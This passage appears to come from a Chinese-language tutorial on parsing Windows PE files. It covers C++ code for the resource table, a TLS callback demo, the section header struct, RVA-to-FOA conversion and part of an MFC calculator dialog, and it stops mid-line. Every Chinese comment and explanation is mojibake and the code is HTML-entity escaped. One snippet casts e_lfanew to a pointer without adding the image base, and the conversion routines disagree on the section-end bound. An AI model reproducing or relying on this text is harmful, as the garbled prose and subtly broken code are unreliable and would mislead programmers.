è·å–åŒºæ®µè¡¨çš„èµ·å§‹ä½ç½®\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\n\tif (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)\n\t&#123;\n\t\treturn dwRva;\n\t&#125;\n\t&#x2F;&#x2F;2 å¾ªç¯åˆ¤æ–­RVAè½åœ¨äº†å“ªä¸ªåŒºæ®µä¸­\n\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)\n\t&#123;\n\t\tDWORD dwSectionRva &#x3D; pHeader[i].VirtualAddress;\n\t\tDWORD dwSectionEndRva &#x3D; dwSectionRva + pHeader[i].SizeOfRawData;\n\t\tDWORD dwSectionFOA &#x3D; pHeader[i].PointerToRawData;\n\t\tif (dwRva &gt;&#x3D; dwSectionRva &amp;&amp; dwRva &lt; dwSectionEndRva)\n\t\t&#123;\n\t\t\tpHeader[i].VirtualAddress;\n\t\t\tDWORD dwFOA &#x3D; dwRva - dwSectionRva + dwSectionFOA;\n\t\t\treturn dwFOA;\n\t\t&#125;\n\t&#125;\n\treturn -1;\n&#125;\nBOOL IsPE_File(char* lpImage)\n&#123;\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tif (pDos-&gt;e_magic !&#x3D; IMAGE_DOS_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\n\tif (pNt-&gt;Signature !&#x3D; IMAGE_NT_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\treturn TRUE;\n&#125;\n\nvoid AnalyzeResource(char* lpImage)\n&#123;\n\t&#x2F;&#x2F;1. æ‰¾åˆ°èµ„æºè¡¨çš„ç»“æ„ä½“\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_OPTIONAL_HEADER pOption &#x3D;  &amp;pNt-&gt;OptionalHeader;\n\t&#x2F;&#x2F;1. å¾—åˆ°äº†èµ„æºè¡¨çš„æ•°æ®ç›®å½•\n\tPIMAGE_DATA_DIRECTORY pResourceDir&#x3D; &amp;pOption-&gt;DataDirectory[2];\n\n\t&#x2F;&#x2F;2. å¾—åˆ°èµ„æºè¡¨ç¬¬ä¸€å±‚çš„ä½ç½®\n\tDWORD dwResourceFOA &#x3D;  RvaToFoa(lpImage, pResourceDir-&gt;VirtualAddress);\n\tPIMAGE_RESOURCE_DIRECTORY pFirstDir &#x3D;(PIMAGE_RESOURCE_DIRECTORY)(dwResourceFOA + lpImage);\n\tPIMAGE_RESOURCE_DIRECTORY_ENTRY pFirstRes &#x3D; (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pFirstDir + 1);\n\t&#x2F;&#x2F;3. è§£æèµ„æºè¡¨\n\tDWORD dwFirstCount &#x3D; pFirstDir-&gt;NumberOfIdEntries + pFirstDir-&gt;NumberOfNamedEntries;\n\t&#x2F;&#x2F;3.1 è§£æç¬¬ä¸€å±‚\n\tfor (int i &#x3D; 0; i &lt; dwFirstCount; i++)\n\t&#123;\n\t\t&#x2F;&#x2F;è§£æç¬¬ä¸€å±‚çš„åç§°ä¿¡æ¯\n\t\tif (pFirstRes[i].NameIsString &#x3D;&#x3D; TRUE)\n\t\t&#123;\n\t\t\t&#x2F;&#x2F;ä»¥å­—ç¬¦ä¸²ä½œä¸ºæ ‡è¯†\n\t\t\tPIMAGE_RESOURCE_DIR_STRING_U pNameInfo &#x3D; \n\t\t\t(PIMAGE_RESOURCE_DIR_STRING_U)(pFirstRes[i].NameOffset + (DWORD)pFirstDir);\n\t\t\tWCHAR* pName &#x3D; new WCHAR[pNameInfo-&gt;Length + 1]&#123;0&#125;;\n\t\t\t&#x2F;&#x2F;wcscpy_s(pName, pNameInfo-&gt;Length, pNameInfo-&gt;NameString);\n\t\t\tfor (int m &#x3D; 0; m &lt; pNameInfo-&gt;Length; m++)\n\t\t\t&#123;\n\t\t\t\tpName[m] &#x3D; pNameInfo-&gt;NameString[m];\n\t\t\t&#125;\n\t\t\twprintf(L&quot;èµ„æºç§ç±»æ ‡è¯†:%s\\n&quot;, pName);\n\t\t&#125;\n\t\t&#x2F;&#x2F;ä»¥æ•°å­—ä½œä¸ºæ ‡è¯†\n\t\telse\n\t\t&#123;\n\t\t\tif (g_mapResourceInfo.count(pFirstRes[i].Id) &#x3D;&#x3D; 1)\n\t\t\t&#123;\n\t\t\t\tprintf(&quot;èµ„æºç§ç±»æ ‡è¯†%s\\n&quot;, g_mapResourceInfo[pFirstRes[i].Id]);\n\t\t\t&#125;\n\t\t\telse\n\t\t\t&#123;\n\t\t\t\tprintf(&quot;èµ„æºç§ç±»æ ‡è¯†%d\\n&quot;, pFirstRes[i].Id);\n\t\t\t&#125;\n\t\t\n\t\t&#125;\n\t\t&#x2F;&#x2F;è§£æç¬¬ä¸€å±‚çš„ä½ç½®ä¿¡æ¯ï¼Œä»è€Œå¾—åˆ°ç¬¬äºŒå±‚\n\t\t\t\n\t\tif (pFirstRes[i].DataIsDirectory &#x3D;&#x3D; 1)\n\t\t&#123;\n\t\t\t&#x2F;&#x2F;æ ¹æ®åç§»å¾—åˆ°ç¬¬äºŒå±‚çš„ä½ç½®,ä»¥åŠæ•°ç»„\n\t\t\tPIMAGE_RESOURCE_DIRECTORY pSecondDir &#x3D;\n\t\t\t\t(PIMAGE_RESOURCE_DIRECTORY)(pFirstRes[i].OffsetToDirectory + (DWORD)pFirstDir);\n\t\t\tPIMAGE_RESOURCE_DIRECTORY_ENTRY pSecondRes &#x3D;\n\t\t\t\tPIMAGE_RESOURCE_DIRECTORY_ENTRY(pSecondDir + 1);\n\t\t\t\n\t\t\t\n\t\t\t&#x2F;&#x2F;ç¬¬äºŒå±‚çš„èµ„æºä¸ªæ•°\n\t\t\tDWORD dwSecondCount  &#x3D; \n\t\t\tpSecondDir-&gt;NumberOfIdEntries + pSecondDir-&gt;NumberOfNamedEntries;\n\t\t\tfor (int j &#x3D; 0; j &lt; dwSecondCount; j++)\n\t\t\t&#123;\n\t\t\t\t&#x2F;&#x2F;è§£æç¬¬äºŒå±‚çš„åç§°ä¿¡æ¯\n\t\t\t\tif (pSecondRes[j].NameIsString &#x3D;&#x3D; TRUE)\n\t\t\t\t&#123;\n\t\t\t\t\t&#x2F;&#x2F;ä»¥å­—ç¬¦ä¸²ä½œä¸ºæ ‡è¯†\n\t\t\t\t\tPIMAGE_RESOURCE_DIR_STRING_U pNameInfo &#x3D;\n\t\t\t\t\t\t(PIMAGE_RESOURCE_DIR_STRING_U)(pSecondRes[j].NameOffset + (DWORD)pFirstDir);\n\t\t\t\t\tWCHAR* pName &#x3D; new WCHAR[pNameInfo-&gt;Length + 1]&#123; 0 &#125;;\n\t\t\t\t\t&#x2F;&#x2F;wcscpy_s(pName, pNameInfo-&gt;Length + 1, pNameInfo-&gt;NameString);\n\t\t\t\t\tfor (int m &#x3D; 0; m &lt; pNameInfo-&gt;Length; m++)\n\t\t\t\t\t&#123;\n\t\t\t\t\t\tpName[m] &#x3D; pNameInfo-&gt;NameString[m];\n\t\t\t\t\t&#125;\n\t\t\t\t\twprintf(L&quot;   èµ„æºæ ‡è¯†:%s\\n&quot;, pName);\n\t\t\t\t&#125;\n\t\t\t\telse\n\t\t\t\t&#123;\n\t\t\t\t\twprintf(L&quot;   èµ„æºæ ‡è¯†:%d\\n&quot;, pSecondRes[j].Id);\n\t\t\t\t&#125;\n\t\t\t\t&#x2F;&#x2F;è§£æç¬¬äºŒå±‚çš„ä½ç½®ä¿¡æ¯\n\t\t\t\tif (pSecondRes[j].DataIsDirectory &#x3D;&#x3D; TRUE)\n\t\t\t\t&#123;\n\t\t\t\t\t&#x2F;&#x2F;æ ¹æ®åç§»å¾—åˆ°ç¬¬ä¸‰å±‚çš„ä½ç½®,ä»¥åŠæ•°ç»„\n\t\t\t\t\tPIMAGE_RESOURCE_DIRECTORY pThirdDir &#x3D;\n\t\t\t\t\t\t(PIMAGE_RESOURCE_DIRECTORY)\n\t\t\t\t\t\t(pSecondRes[j].OffsetToDirectory+ (DWORD)pFirstDir);\n\t\t\t\t\tPIMAGE_RESOURCE_DIRECTORY_ENTRY pThirdRes &#x3D;\n\t\t\t\t\t(PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pThirdDir + 1);\n\n\t\t\t\t\t&#x2F;&#x2F;è§£æç¬¬ä¸‰å±‚ï¼Œä½†æ˜¯ä¸éœ€è¦å¾ªç¯äº†\n\t\t\t\t\tPIMAGE_RESOURCE_DATA_ENTRY pData &#x3D; \n\t\t\t\t\t(PIMAGE_RESOURCE_DATA_ENTRY)(pThirdRes-&gt;OffsetToData + (DWORD)pFirstDir);\n\t\t\t\t\t&#x2F;&#x2F;pData-&gt;OffsetToData èµ„æºèµ·å§‹ä½ç½®çš„RVA\n\t\t\t\t\t&#x2F;&#x2F;pData-&gt;Size  èµ„æºçš„å¤§å°\n\t\t\t\t\tprintf(&quot;            èµ„æºçš„èµ·å§‹RVAï¼š%x  èµ„æºçš„å¤§å°ï¼š%x\\n&quot;, pData-&gt;OffsetToData, pData-&gt;Size);\n\t\t\t\t\t&#x2F;&#x2F;è·å–åˆ°èµ„æºçš„æ•°æ®äº†ï¼Œè¾“å‡º10ä¸ªå­—èŠ‚ï¼Œç”¨äºå¯¹æ¯”\n\t\t\t\t\tunsigned char* pRes &#x3D; (unsigned char *)\n\t\t\t\t\t\t(RvaToFoa(lpImage, pData-&gt;OffsetToData) + lpImage);\n\t\t\t\t\tprintf(&quot;            &quot;);\n\t\t\t\t\tfor (size_t m&#x3D; 0; m &lt; 10; m++)\n\t\t\t\t\t&#123;\n\t\t\t\t\t\tprintf(&quot;%x  &quot;, pRes[m]);\n\t\t\t\t\t&#125;\n\t\t\t\t\tprintf(&quot;\\n&quot;);\n\t\t\t\t&#125;\n\t\t\t&#125;\n\t\t&#125;\n\t&#125;\n&#125;\n\nTLSè¡¨ç®€ä»‹çº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼šå¯ä»¥å°†TLSå…¨å±€å˜é‡ï¼Œåœ¨æ¯ä¸€ä¸ªçº¿ç¨‹ä¸­éƒ½åˆ›å»ºä¸€ä»½ï¼Œä»è€Œè§£å†³ä¸€å®šçš„çº¿ç¨‹åŒæ­¥é—®é¢˜ã€‚\næµ‹è¯•ä»£ç C++\n&#x2F;&#x2F; 03_TLS.cpp : æ­¤æ–‡ä»¶åŒ…å« &quot;main&quot; å‡½æ•°ã€‚ç¨‹åºæ‰§è¡Œå°†åœ¨æ­¤å¤„å¼€å§‹å¹¶ç»“æŸã€‚\n&#x2F;&#x2F;\n\n#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n#pragma comment(linker, &quot;&#x2F;INCLUDE:__tls_used&quot;)\nint g_nNum1 &#x3D; 100;\n_declspec(thread) int g_nNum2 &#x3D; 200;&#x2F;&#x2F;TLSçš„å…¨å±€å˜é‡\n\n&#x2F;&#x2F; TLSå›è°ƒå‡½æ•°A\nvoid NTAPI t_TlsCallBack_A(PVOID DllHandle, DWORD Reason, PVOID Red) &#123;\n\tif (DLL_PROCESS_ATTACH &#x3D;&#x3D; Reason)\n\t&#123;\n\t\tprintf(&quot;i am a  mimidaima!\\r\\n&quot;);\n\t&#125;\n\tif (DLL_THREAD_DETACH &#x3D;&#x3D; Reason) &#x2F;&#x2F; å¦‚æœçº¿ç¨‹é€€å‡ºåˆ™æ‰“å°ä¿¡æ¯\n\t\tprintf(&quot;t_TlsCallBack_A -&gt; ThreadDetach!\\r\\n&quot;);\n\treturn;\n&#125;\n&#x2F;&#x2F; TLSå›è°ƒå‡½æ•°B\nvoid NTAPI t_TlsCallBack_B(PVOID DllHandle, DWORD Reason, PVOID Red) &#123;\n\tif (DLL_THREAD_DETACH &#x3D;&#x3D; Reason) &#x2F;&#x2F; å¦‚æœçº¿ç¨‹é€€å‡ºåˆ™æ‰“å°ä¿¡æ¯\n\t\tprintf(&quot;t_TlsCallBack_B -&gt; ThreadDetach!\\r\\n&quot;);\n\treturn;\n&#125;\n\n&#x2F;*\n* æ³¨å†ŒTLSå›è°ƒå‡½æ•°ï¼Œ&quot;.CRT$XLB&quot;çš„å«ä¹‰æ˜¯ï¼š\n* CRTè¡¨æ˜ä½¿ç”¨C RunTimeæœºåˆ¶\n* Xè¡¨ç¤ºæ ‡è¯†åéšæœº\n* Lè¡¨ç¤ºTLS callback section\n* Bå…¶å®ä¹Ÿå¯ä»¥ä¸ºB-Yçš„ä»»æ„ä¸€ä¸ªå­—æ¯\n*&#x2F;\n#pragma data_seg(&quot;.CRT$XLB&quot;)\nPIMAGE_TLS_CALLBACK p_thread_callback[] &#x3D; &#123;\n\tt_TlsCallBack_A,\n\tt_TlsCallBack_B,\n\tNULL &#125;;\n#pragma data_seg()\n\nDWORD WINAPI t_ThreadFun(PVOID pParam) &#123;\n\t\n\tprintf(&quot;%p  &quot;, &amp;g_nNum1);\n\tprintf(&quot;%p\\n&quot;, &amp;g_nNum2);\n\treturn 0;\n&#125;\n\nint main()\n&#123;\n\tprintf(&quot;%p  &quot;, &amp;g_nNum1);\n\tprintf(&quot;%p\\n&quot;, &amp;g_nNum2);\n\tHANDLE hThread &#x3D; CreateThread(NULL, 0, t_ThreadFun, NULL, 0, 0);\n\tWaitForSingleObject(hThread, -1);\n\treturn 0;\n&#125;\n\nåŒºæ®µè¡¨ç»“æ„ä½“æ•°ç»„æ•°ç»„çš„å…ƒç´ ä¸ªæ•°ç”±æ–‡ä»¶å¤´ä¸­çš„NumberOfSectionå†³å®šã€‚\nC++\ntypedef struct _IMAGE_SECTION_HEADER &#123;\n    BYTE    Name[0x8];\t                       &#x2F;&#x2F; (1) åŒºæ®µå\n    union &#123;\n            DWORD   PhysicalAddress; \n            DWORD   VirtualSize;                  &#x2F;&#x2F; (2) *åŒºæ®µå¤§å°\n &#125; Misc;\t\t\t\t\t\n    DWORD   VirtualAddress;\t\t&#x2F;&#x2F; (3)åŒºæ®µçš„RVAåœ°å€*\n    DWORD   SizeOfRawData;\t\t&#x2F;&#x2F; (4) æ–‡ä»¶ä¸­çš„åŒºæ®µå¯¹é½å¤§å°*\n    DWORD   PointerToRawData;\t\t&#x2F;&#x2F; (5) åŒºæ®µåœ¨æ–‡ä»¶ä¸­çš„åç§»*\n    DWORD   PointerToRelocations;\t&#x2F;&#x2F; (6) é‡å®šä½çš„åç§»ï¼ˆOBJï¼‰\n    DWORD   PointerToLinenumbers;\t&#x2F;&#x2F; (7) è¡Œå·è¡¨çš„åç§»ï¼ˆè°ƒè¯•ï¼‰\n    WORD    NumberOfRelocations;\t&#x2F;&#x2F; (8) é‡å®šä½é¡¹æ•°é‡ï¼ˆOBJï¼‰\n    WORD    NumberOfLinenumbers;\t&#x2F;&#x2F; (9) è¡Œå·è¡¨é¡¹æ•°é‡\n    DWORD   Characteristics;\t\t&#x2F;&#x2F; (10) åŒºæ®µçš„å±æ€§\n&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;\n\næ€ä¹ˆæ‰¾åˆ°åŒºæ®µè¡¨å®ï¼šIMAGE_FIRST_SECTION(NTå¤´çš„åœ°å€)\nè®¡ç®—ï¼šNTå¤´çš„åœ°å€+0x4+0x14+0xE0\n&#x2F;&#x2F;æ‰“å¼€PEæ–‡ä»¶åï¼Œç¬¬ä¸€ä¸ªæ®µå°±æ˜¯DOSå¤´éƒ¨\nPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n&#x2F;&#x2F;pDosçš„e_lfanewå­—æ®µå¯ä»¥æŒ‡å‘NTå¤´çš„ç©ºé—´ï¼Œä½¿ç”¨NTå¤´æ¥æ”¶\nPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;\n&#x2F;&#x2F;ä½¿ç”¨IMAGE_FIRST_SECTIONè¿™ä¸ªå®ï¼Œä¼ å›¾NTå¤´æ¥è·å–åŒºæ®µè¡¨\nPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\nåŒºæ®µè¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ æè¿°çš„å°±æ˜¯ä¸€ä¸ªåŒºæ®µçš„ä¿¡æ¯1 Nameï¼šåŒºæ®µå\n2 PointerToRawData åœ¨æ–‡ä»¶ä¸­çš„ä½ç½® FOA\n3 SizeOfRawDataåœ¨æ–‡ä»¶ä¸­çš„å¤§å°\n4 VirtualAddressåœ¨å†…å­˜ä¸­çš„ä½ç½® RVA\n5 Misc.VirtualSize:åœ¨å†…å­˜ä¸­çš„å¤§å°\n6 Characteristics:åŒºæ®µçš„å±æ€§ï¼šå¯è¯» å¯å†™ å¯æ‰§è¡Œã€‚ã€‚ã€‚ã€‚\nåŒºæ®µè¡¨ä¸­çš„ä»¥ä¸‹å››ä¸ªå­—æ®µä¿å­˜çš„æ˜¯ä»€ä¹ˆï¼ŸVirtualAddressï¼š åŒºæ®µèµ·å§‹ä½ç½®çš„RVA\nPointerToRawDataï¼š åŒºæ®µåœ¨æ–‡ä»¶ä¸­çš„èµ·å§‹åç§»\nVirtualSizeï¼š åŒºæ®µåœ¨å†…å­˜ä¸­çš„å¤§å°ï¼ˆæ²¡æœ‰å¯¹é½ï¼‰\nSizeOfRawDataï¼š åŒºæ®µåœ¨æ–‡ä»¶ä¸­çš„å¤§å°ï¼ˆå¯¹é½è¿‡çš„ï¼‰\næ˜¯å¦VirtualSize ä¸€å®šä¼šå°äºSizeOfRawDataï¼Ÿ\nä¸æ˜¯çš„ï¼Œæœ‰å¯èƒ½æ˜¯è¿™ä¸ªåŒºæ®µåœ¨æ–‡ä»¶ä¸­æ²¡æœ‰æ•°æ®ï¼Œè¿è¡Œèµ·æ¥ä¹‹åï¼Œæ‰æœ‰æ•°æ®ã€‚\næµ‹è¯•ä»£ç C++\n#include &lt;Windows.h&gt;\nvoid AnalyzeNTHeader(char* lpImage)\n&#123;\n\t&#x2F;&#x2F;1 æ‰¾åˆ°NTå¤´\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n    PIMAGE_FILE_HEADER pFileHeader &#x3D; &amp;pNt-&gt;FileHeader;\n    PIMAGE_OPTIONAL_HEADER pOption &#x3D; &amp;pNt-&gt;OptionalHeader;\n\t&#x2F;&#x2F;2 å¼€å§‹è§£ææ–‡ä»¶å¤´\n\tprintf(&quot;è¿è¡Œå¹³å°:%x\\n&quot;,pFileHeader-&gt;Machine);\n\tprintf(&quot;åŒºæ®µæ•°é‡:%x\\n&quot;, pFileHeader-&gt;NumberOfSections);\n\tprintf(&quot;æ‰©å±•å¤´å¤§å°:%x\\n&quot;, pFileHeader-&gt;SizeOfOptionalHeader);\n\tprintf(&quot;æ—¶é—´æˆ³:%x\\n&quot;, pFileHeader-&gt;TimeDateStamp);\n\tprintf(&quot;å±æ€§:%x\\n&quot;, pFileHeader-&gt;Characteristics);\n\t&#x2F;&#x2F;3 è§£ææ‰©å±•å¤´\n\t&#x2F;&#x2F;ã€‚ã€‚ã€‚\n&#125;\nvoid AnalyzeSectionTable(char* lpImage)\n&#123;\n\t&#x2F;&#x2F;1 è·å–åŒºæ®µè¡¨çš„èµ·å§‹ä½ç½®\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\t&#x2F;&#x2F;2 è§£æ\n\tfor (int  i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)\n\t&#123;\n\t\tprintf(&quot;åŒºæ®µåï¼š%s\\t&quot;, pHeader[i].Name);\n\t\tprintf(&quot;å†…å­˜ä¸­å¤§å°ï¼š%X\\t&quot;, pHeader[i].Misc.VirtualSize);\n\t\tprintf(&quot;å†…å­˜ä¸­RVAï¼š%X\\t&quot;, pHeader[i].VirtualAddress);\n\t\tprintf(&quot;æ–‡ä»¶ä¸­å¤§å°ï¼š%X\\t&quot;, pHeader[i].SizeOfRawData);\n\t\tprintf(&quot;æ–‡ä»¶ä¸­FOAï¼š%X\\t&quot;, pHeader[i].PointerToRawData);\n\t\tprintf(&quot;å±æ€§ï¼š%X\\t&quot;, pHeader[i].Characteristics);\n\t\tprintf(&quot;\\n&quot;);\n\t&#125;\n&#125;\n\nRVAå’ŒFOAä¹‹é—´çš„è½¬æ¢æ–‡ä»¶åç§»ï¼ˆFOAæˆ–è€…Offsetï¼‰ï¼š æŸä¸€ä¸ªæ•°æ®è·ç¦»æ–‡ä»¶å¼€å¤´çš„åç§»\nRVAæ€ä¹ˆè½¬æ¢æˆFOARVA - RVAåŒºæ®µ &#x3D; FOA -FOAåŒºæ®µ\nFOA &#x3D; RVA - RVAåŒºæ®µ+FOAåŒºæ®µ\nä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒPEæ–‡ä»¶çš„å¤´éƒ¨åœ¨æ–‡ä»¶ä¸­æ˜¯å¤šå¤§ï¼Ÿ0x400\nPEæ–‡ä»¶çš„å¤´éƒ¨åœ¨å†…å­˜ä¸­æ˜¯å¤šå¤§0x1000\nRVAä¸º0x600çš„æ—¶å€™ï¼Œè½¬ä¸ºFOA è½¬ä¸äº†ï¼Œåœ¨æ–‡ä»¶ä¸­æ²¡æœ‰å¯¹åº”çš„ä½ç½®\nè™šæ‹Ÿåœ°å€ï¼ˆVAï¼‰ï¼šç¨‹åºåœ¨è¿è¡Œçš„æ—¶å€™ï¼Œæ˜¯å°†PEæ–‡ä»¶åŠ è½½åˆ°è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ã€‚è¿›ç¨‹çš„è¿™å—å†…å­˜ç©ºé—´å°±ç§°ä¹‹ä¸º è™šæ‹Ÿå†…å­˜ç©ºé—´ 32ä½ç¨‹åºè™šæ‹Ÿå†…å­˜ç©ºé—´æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½çš„ï¼Œæ¯ä¸€ä¸ªå­—èŠ‚éƒ½æœ‰ä¸€ä¸ªç¼–å·ä»0x0000 0000åˆ°0xFFFFFFFFä¹‹é—´ã€‚è¿™äº›ç¼–å·å°±æ˜¯è™šæ‹Ÿåœ°å€ã€‚\nç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼ˆRVAï¼‰ï¼šPEæ–‡ä»¶ä¸ä¼šå æ»¡æ•´ä¸ªè™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œè€Œæ˜¯ä¼šå ç”¨ä¸€éƒ¨åˆ†ã€‚é‚£ä¹ˆå°±ä¼šæœ‰ä¸€ä¸ªèµ·å§‹ä½ç½®ï¼Œè¿™ä¸ªèµ·å§‹ä½ç½®ä¹Ÿæˆä¸ºåŠ è½½åŸºå€ã€‚PEæ–‡ä»¶ä¸­çš„æ•°æ®ç›¸å¯¹äºåŠ è½½åŸºå€çš„åç§»å°±æ˜¯ç›¸å¯¹è™šæ‹Ÿåœ°å€ã€‚\nå¦‚æœç³»ç»ŸåŠ è½½PEæ–‡ä»¶çš„æ—¶å€™ï¼Œæ˜¯å°†PEæ–‡ä»¶åŸå°ä¸åŠ¨çš„å¤åˆ¶åˆ°äº†å†…å­˜ä¸­ï¼Œé‚£ä¹ˆæŸä¸€ä¸ªæ•°æ®çš„FOAå’ŒRVAå°±æ˜¯ç›¸ç­‰çš„ã€‚\nä½†æ˜¯ç°å®æƒ…å†µå¹¶éå¦‚æ­¤ï¼Œç³»ç»ŸåŠ è½½PEæ–‡ä»¶åˆ°å†…å­˜çš„ä¹‹åï¼ŒPEæ–‡ä»¶æ˜¯è¢«æ‰©å±•äº†çš„ã€‚\nDWORD RvaToFoa(char* lpImage,DWORD dwRva)\n&#123;\n\t&#x2F;&#x2F;1 è·å–åŒºæ®µè¡¨çš„èµ·å§‹ä½ç½®\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\t\n\tif (dwRva&lt; pNt-&gt;OptionalHeader.SizeOfHeaders)\n\t&#123;\n\t\treturn dwRva;\n\t&#125;\n\t&#x2F;&#x2F;2 å¾ªç¯åˆ¤æ–­RVAè½åœ¨äº†å“ªä¸ªåŒºæ®µä¸­\n\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)\n\t&#123;\n\t\tDWORD dwSectionRva &#x3D;  pHeader[i].VirtualAddress;\n\t\tDWORD dwSectionEndRva &#x3D; dwSectionRva + pHeader[i].SizeOfRawData;\n\t\tDWORD dwSectionFOA &#x3D; pHeader[i].PointerToRawData;\n\t\tif (dwRva&gt;&#x3D; dwSectionRva &amp;&amp;dwRva&lt;&#x3D; dwSectionEndRva)\n\t\t&#123;\n\t\t\tpHeader[i].VirtualAddress;\n\t\t\tDWORD dwFOA &#x3D; dwRva - dwSectionRva+ dwSectionFOA;\n\t\t\treturn dwFOA;\n\t\t&#125;\n\t&#125;\n\treturn -1;\n&#125;\n\nå°åŠŸèƒ½çš„å®ç°ä½ç½®è®¡ç®—&#x2F;&#x2F;ä½ç½®è®¡ç®—å™¨æŒ‰é’®\nvoid CPEDlg::OnBnClickedButton2()\n&#123;\n\tUpdateData(TRUE);\n\tif (m_strEditTest1 !&#x3D; L&quot;&quot;)\n\t&#123;\n\t\tCMGpsCalcDlg* pPrcPopDg &#x3D; new CMGpsCalcDlg;\n\n\t\tpPrcPopDg-&gt;Create(IDD_DIALOG1, this);\n\t\tpPrcPopDg-&gt;ShowWindow(SW_SHOW);\n\t\tpPrcPopDg-&gt;GetPath(buf);\n\t&#125;\n\n&#125;\n\nvoid CMGpsCalcDlg::RvaToFoa()\n&#123;\n\tUpdateData(TRUE);\n\t\n\tCString svPid &#x3D; m_strEditRva.GetString();\n\tDWORD dwRva &#x3D; _tcstoul(svPid, NULL, 16);\n\t\n\t\n\t\n\t&#x2F;&#x2F;1 è·å–åŒºæ®µè¡¨çš„èµ·å§‹ä½ç½®\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)buf;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + buf);\n\tPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\tPIMAGE_OPTIONAL_HEADER pOption &#x3D; &amp;pNt-&gt;OptionalHeader;\n\n\tif (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)\n\t&#123;\n\t\tCString cd;\n\t\tcd.Format(L&quot;%x&quot;, dwRva);\n\t\tm_strEditFoa.SetString(cd);\n\t\tUpdateData(FALSE);\n\t\treturn;\n\t&#125;\n\t&#x2F;&#x2F;2 å¾ªç¯åˆ¤æ–­RVAè½åœ¨äº†å“ªä¸ªåŒºæ®µä¸­\n\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)\n\t&#123;\n\t\tDWORD dwSectionRva &#x3D; pHeader[i].VirtualAddress;\n\t\tDWORD dwSectionEndRva &#x3D; dwSectionRva + pHeader[i].SizeOfRawData;\n\t\tDWORD dwSectionFOA &#x3D; pHeader[i].PointerToRawData;\n\t\tif (dwRva &gt;&#x3D; dwSectionRva &amp;&amp; dwRva &lt;&#x3D; dwSectionEndRva)\n\t\t&#123;\n\t\t\tpHeader[i].VirtualAddress;\n\t\t\t\n\t\t\t&#x2F;&#x2F;FOA\t\t&#x3D; RVA   - RVAåŒºæ®µ\t   + FOAåŒºæ®µ\n\t\t\tDWORD dwFOA &#x3D; dwRva - dwSectionRva + dwSectionFOA;\n\t\t\tCString foa;\n\t\t\tfoa.Format(L&quot;%x&quot;,dwFOA);\n\t\t\tm_strEditFoa.SetString(foa);\n\n\t\t\t&#x2F;&#x2F;vaè™šæ‹Ÿåœ°å€&#x3D; InmageBase(åŠ è½½åŸºå€) + RVA(ç›¸å¯¹è™šæ‹Ÿåœ°å€)\n\t\t\tDWORD dwVA &#x3D; pOption-&gt;ImageBase + dwRva;\n\t\t\tCString va;\n\t\t\tva.Format(L&quot;%x&quot;, dwVA);\n\t\t\tm_strEditVa.SetString(va);\n\n\t\t\t&#x2F;&#x2F;åŒºæ®µå\n\t\t\tCString name;\n\t\t\tname.Format(L&quot;%S&quot;, 